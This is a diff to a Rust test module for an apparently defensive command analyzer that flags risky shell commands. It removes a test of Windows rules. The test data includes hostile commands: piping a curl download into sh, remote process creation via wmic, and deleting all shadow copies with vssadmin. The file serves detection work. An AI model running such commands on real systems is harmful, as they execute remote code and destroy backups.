@@ -584,24 +584,4 @@ mod tests {
         assert!(!fires("sort access.log | shuf", "pipe-to-sh"));
         assert!(fires("curl http://x/s.sh | sh", "pipe-to-sh"));
     }
-
-    // ---- Increment C: Windows KB migrated to structured `match` -------------
-
-    /// Windows entries whose legacy `args_contains` was multi-word migrate to the
-    /// `joined` leaf (a per-arg `contains` would miss a phrase split across
-    /// tokens). Guard that they still fire on realistic commands.
-    #[test]
-    fn windows_multiword_args_match_via_joined() {
-        let kb = win_kb();
-        let fires =
-            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
-        assert!(fires(
-            "wmic /node:dc01 process call create \"cmd /c calc\"",
-            "wmic-process-create"
-        ));
-        assert!(fires(
-            "vssadmin delete shadows /all /quiet",
-            "vssadmin-delete"
-        ));
-    }
 }
